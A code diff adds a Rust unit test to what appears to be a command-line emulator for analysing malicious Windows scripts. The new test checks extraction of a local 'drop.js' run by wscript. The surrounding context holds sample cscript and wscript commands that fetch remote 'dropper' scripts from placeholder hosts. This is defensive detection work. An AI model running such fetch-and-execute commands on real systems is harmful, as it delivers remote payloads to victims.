@@ -9288,6 +9288,27 @@ mod cscript_tests {
     }
 
     #[test]
+    fn wscript_current_dir_js_content_extracts_payload() {
+        let mut env = Environment::new(&Config::default());
+        let js_content = b"WScript.Echo('dot')\r\n".to_vec();
+        env.modified_filesystem.insert(
+            "drop.js".to_string(),
+            FsEntry::Content {
+                content: js_content.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(r#"wscript .\drop.js"#, &mut env);
+
+        assert!(
+            env.exec_jscript.iter().any(|c| c == &js_content),
+            "current-directory JS was not extracted: {:?}",
+            env.exec_jscript
+        );
+    }
+
+    #[test]
     fn script_hosts_emit_url_argument_and_lolbas_for_remote_scripts() {
         let cscript_raw = r#"cscript //nologo "https://script-host.example/dropper.vbs""#;
         let wscript_raw = r#"wscript "script-host-schemeless.example/dropper.js""#;
